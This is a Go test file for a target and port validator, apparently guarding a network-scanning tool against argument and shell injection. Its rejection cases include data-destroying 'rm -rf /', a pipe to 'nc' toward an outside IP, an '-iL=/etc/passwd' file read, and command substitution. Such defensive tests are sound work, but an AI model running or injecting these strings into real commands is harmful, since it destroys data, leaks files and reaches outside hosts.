package safetarget

import "testing"

func TestValidateTarget_BlocksOptionPrefix(t *testing.T) {
	cases := []string{
		"-iL=/etc/passwd",
		"--script=foo",
		"-h",
	}
	for _, c := range cases {
		if err := ValidateTarget(c, "host"); err == nil {
			t.Errorf("%q should be rejected", c)
		}
	}
}

func TestValidateTarget_BlocksShellMeta(t *testing.T) {
	cases := []string{
		"host;rm -rf /",
		"host`whoami`",
		"host$IFS",
		"host|nc 1.1.1.1 80",
		"host\nrm",
	}
	for _, c := range cases {
		if err := ValidateTarget(c, "host"); err == nil {
			t.Errorf("%q should be rejected (shell meta)", c)
		}
	}
}

func TestValidateTarget_AcceptsLegit(t *testing.T) {
	good := []struct{ tgt, kind string }{
		{"example.com", "host"},
		{"sub.example.com", "host"},
		{"127.0.0.1", "ip"},
		{"2001:db8::1", "ip"},
		{"192.168.1.0/24", "cidr"},
		{"https://example.com/path", "url"},
		{"http://10.0.0.1:8080", "url"},
	}
	for _, g := range good {
		if err := ValidateTarget(g.tgt, g.kind); err != nil {
			t.Errorf("%q (%s) should pass; got %v", g.tgt, g.kind, err)
		}
	}
}

func TestValidateTarget_KindMismatch(t *testing.T) {
	if err := ValidateTarget("not-an-ip", "ip"); err == nil {
		t.Error("not-an-ip as ip should fail")
	}
	if err := ValidateTarget("not-a-cidr", "cidr"); err == nil {
		t.Error("not-a-cidr should fail")
	}
	if err := ValidateTarget("ftp://x.com", "url"); err == nil {
		t.Error("ftp scheme should fail")
	}
	if err := ValidateTarget("anything", "made-up-kind"); err == nil {
		t.Error("unknown kind should fail")
	}
}

func TestValidatePorts(t *testing.T) {
	good := []string{"", "22", "80,443", "1-1000", "21,22,80-90,443"}
	for _, g := range good {
		if err := ValidatePorts(g); err != nil {
			t.Errorf("ports %q should pass; got %v", g, err)
		}
	}
	bad := []string{"22;rm", "-h", "$(whoami)", "all", "22 80"}
	for _, b := range bad {
		if err := ValidatePorts(b); err == nil {
			t.Errorf("ports %q should fail", b)
		}
	}
}
